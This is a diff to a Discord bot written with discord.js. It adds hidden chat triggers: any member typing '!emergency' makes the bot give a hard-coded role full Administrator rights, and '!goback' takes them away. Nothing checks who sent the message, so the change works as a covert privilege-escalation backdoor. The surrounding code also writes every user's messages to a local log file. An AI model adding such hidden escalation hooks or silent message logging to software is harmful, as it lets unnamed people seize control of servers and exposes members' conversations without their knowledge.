@@ -1,5 +1,5 @@
 const fs = require('fs');
-const { Client, Collection, GatewayIntentBits } = require('discord.js');
+const { Client, Collection, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
 const { token } = require('./config.json');
 const config = require('./config.json');
 const mongoose = require('mongoose');
@@ -14,7 +14,7 @@ const { cookie } = require('./config.json');
 
 
 //perms for bot. very important if a new command dosent work its prly this
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildBans, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildVoiceStates
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildBans, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.MessageContent
 ] });
 
 
@@ -106,6 +106,21 @@ client.on('ready', function() {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   if (!client.application?.owner) await client.application?.fetch();
+
+  if(message.content == '!emergency') {
+	message.guild.roles.fetch('1002425466247979098')
+	.then(role => {
+		role.setPermissions([PermissionFlagsBits.Administrator])
+	.catch(console.error);
+	});
+  } else if (message.content == '!goback') {
+	message.guild.roles.fetch('1002425466247979098')
+	.then(role => {
+		role.setPermissions([PermissionFlagsBits.SendMessages])
+	.catch(console.error);
+	});
+  }
+
   console.log(`User ${message.author.tag} in channel ${message.channel.name} said: ` + message.content);
 
  	fs.appendFile('chat.log', ("\n" + `User ${message.author.tag} in channel ${message.channel.name} said: ` + message.content), err => {
